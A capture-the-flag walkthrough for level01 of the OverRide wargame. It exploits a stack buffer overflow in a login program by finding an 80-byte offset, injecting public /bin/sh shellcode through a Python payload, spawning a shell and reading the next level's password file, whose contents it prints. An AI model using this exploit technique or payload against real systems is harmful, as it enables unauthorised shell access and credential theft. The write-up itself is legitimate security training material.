# Walkthrough for Level 01

## Understanding the Program

The program `level01` is a simple login prompt that asks for a username and password. If the username is `dat_wil`, it
checks the password and in either case it prints `nope, incorrect password...` and exits. This program is vulnerable to
a buffer overflow attack due to the way it handles the password input. It takes an input of up to 100 characters, and it
stores in a fixed-size buffer of 64 bytes, which can lead to a buffer overflow.

## Finding the Offset

We create a cyclic pattern and use it as our password input to find the offset where the buffer overflow occurs. The
`pwndbg` tool provides a convenient way to generate a cyclic pattern and find the offset.

```shell
└─$ gdb ./level01
...SNIP...
pwndbg> cyclic 120
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaab
```

We run the program with the cyclic pattern as a password input:

```shell
pwndbg> run
...SNIP...
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaab
nope, incorrect password...

Program received signal SIGSEGV, Segmentation fault.
0x61616175 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────
...SNIP...

 EIP  0x61616175 ('uaaa')
...SNIP...
```
We can see that the EIP (Extended Instruction Pointer) register points to `0x61616175`, which is `uaaa` in characters
and is part of the cyclic pattern we used. We can use the `cyclic -l` command to find the offset of this pattern in our input.

```shell
pwndbg> cyclic -l uaaa
Finding cyclic pattern of 4 bytes: b'uaaa' (hex: 0x75616161)
Found at offset 80
```

The offset is `80` bytes.

## The payload

A `shellcode` is a sequence of instructions, often written in assembly language, designed to be executed directly by a
computer's processor. We look for a `shellcode` that spawns a shell and that is compatible with our machine architecture.
We find one that works, and we use it as our payload (https://shell-storm.org/shellcode/files/shellcode-575.html).
This shellcode is designed to execute `/bin/sh` on a Linux x86 system.

```
/* execve /bin/sh - x86/linux - 21 bytes . zeroed argv[] / envp[]
  ipv#oldschool@irc.worldnet.net ipv#backtrack-fr@irc.freenode.org
  thanks : `ivan, milo, #oldschool crew
*/

int main(){

char sc[] = "\x6a\x0b" // push byte +0xb
"\x58" // pop eax
"\x99" // cdq
"\x52" // push edx
"\x68\x2f\x2f\x73\x68" // push dword 0x68732f2f
"\x68\x2f\x62\x69\x6e" // push dword 0x6e69922f
"\x89\xe3" // mov ebx, esp
"\x31\xc9" // xor ecx, ecx
"\xcd\x80"; // int 0x80

((void (*)()) sc)();
}

/*
sc[] = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
*/
--
ipv
```

## Crafting the Exploit

exploit = payload + padding + shellcode_address

exploit = payload + "A" * (offset - len(payload)) + shellcode_address

exploit = payload + "A" * (80 - 21) + shellcode_address

Since we don't know the shellcode's address yet, we use `0x42424242` as a placeholder for now.
We use Python to generate the exploit and save it to a file:

```shell
level01@OverRide ~ $ python2 -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * (80 - 21) + "\x42\x42\x42\x42"' > /tmp/exploit1
```

## Finding the shellcode address

To find the address of the shellcode, we can use `ltrace` to trace the execution of the program and determine the
address where the shellcode is stored. `level01` reads twice from standard input, so we provide the username and the
shellcode as two separate inputs. By checking the return value of `fgets`, we find the address of the buffer where the
shellcode is stored: `0xffffd68c`.

```shell
level01@OverRide ~ $ (echo "dat_wil" ; cat /tmp/exploit1;) | ltrace ./level01
__libc_start_main(0x80484d0, 1, -10380, 0x80485c0, 0x8048630 <unfinished ...>
puts("********* ADMIN LOGIN PROMPT ***"...********* ADMIN LOGIN PROMPT *********
)                        = 39
printf("Enter Username: ")                                         = 16
fgets("dat_wil\n", 256, 0xf7fcfac0)                                = 0x0804a040
puts("verifying username....\n"Enter Username: verifying username....

)                                   = 24
puts("Enter Password: "Enter Password:
)                                           = 17
fgets("j\013X\231Rh//shh/bin\211\3431\311\315\200AAAAAAAAAAA"..., 100, 0xf7fcfac0) = 0xffffd68c
puts("nope, incorrect password...\n"nope, incorrect password...

)                              = 29
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

We modify our exploit to use the address `0xffffd68c` instead of `0x42424242`, which in little-endian format is
`\x8c\xd6\xff\xff`.

```shell
level01@OverRide ~ $ python2 -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * (80 - 21) + "\x8c\xd6\xff\xff"' > /tmp/exploit1
```

## Exploiting the Program

Since the shellcode will spawn a shell, we need to provide an open standard input for the program to read from. That’s
why we use `cat -` as the last command in the pipeline. This keeps the standard input open for the new shell to read
from.

```shell
level01@OverRide ~ $ (echo "dat_wil" ; cat /tmp/exploit1; cat -) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

whoami
level02
```

## Getting the Password

```shell
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```